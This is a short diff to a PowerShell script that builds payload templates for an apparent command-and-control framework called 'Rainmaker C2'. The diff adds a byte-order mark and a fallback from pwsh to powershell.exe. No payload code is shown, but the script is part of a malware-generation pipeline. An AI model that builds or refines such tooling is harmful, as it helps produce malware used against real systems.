@@ -1,4 +1,4 @@
-# Rainmaker C2 :: 构建载荷模板 (供服务端内置生成器使用)
+﻿# Rainmaker C2 :: 构建载荷模板 (供服务端内置生成器使用)
 #
 # 背景: 原先每生成一个载荷都要调 gcc 重新编译 —— 生成端必须装 MinGW + PowerShell。
 # 现在把编译挪到**项目构建期**: 这里产出的模板被打进服务端二进制 (go:embed),
@@ -116,7 +116,13 @@ foreach ($t in $targets) {
                '-Sleep', $PH_SLEEP, '-Quiet')
     if ($MinGw -ne '') { $gargs += @('-MinGw', $MinGw) }
 
-    $log = & pwsh @gargs 2>&1
+    # 与 gen_payload2.ps1 的宿主策略一致: 优先 pwsh(7+, 默认 UTF-8), 退回
+    # powershell.exe(5.1, ANSI)。原实现硬编码 pwsh, 在只装 5.1 的机器上会直接
+    # "The term 'pwsh' is not recognized" 而中断整批模板构建。
+    $psHost = 'pwsh.exe'
+    if (-not (Get-Command $psHost -ErrorAction SilentlyContinue)) { $psHost = 'powershell.exe' }
+
+    $log = & $psHost @gargs 2>&1
     if ($LASTEXITCODE -ne 0) {
         Write-Host ("    [!] 生成失败: {0}" -f ($log | Select-Object -Last 3)) -ForegroundColor Red
         continue
